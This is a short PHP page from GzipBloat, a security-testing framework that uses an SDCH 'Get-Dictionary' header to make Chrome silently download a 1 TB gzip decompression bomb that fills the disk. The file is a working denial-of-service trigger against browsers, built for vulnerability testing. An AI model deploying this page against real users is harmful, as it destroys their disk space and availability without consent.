<?php

/*
    Copyright (C) 2013  Cyberis Ltd. Author geoff.jones@cyberis.co.uk

    This file is part of GzipBloat, a PHP framework to test User-Agents 
    and intermediary content inspection devices for denial-of-service 
    vulnerabilities with respect to HTTP response decompression.

    GzipBloat is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    GzipBloat is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


$path = dirname($_SERVER['SCRIPT_NAME']);
$dict = $path . "/gzipBloat.php?infile=1T.gzipx4&filename=dictionary.sdch&contenttype=application/x-sdch-dictionary&rounds=4";

//Set the header to make the UA request the dictionary
header('Get-Dictionary: ' . $dict);
?>

<html>
<title>1Tb SDCH dictionary, Gzip'd up (1T.gzipx4)</title>
<body>
<p>Chrome (or any other SDCH enabled browser) should have requested an SDCH dictionary in the background...watch it consume all available disk space as it trys to decompresses the response.</p>

</body>
</html>
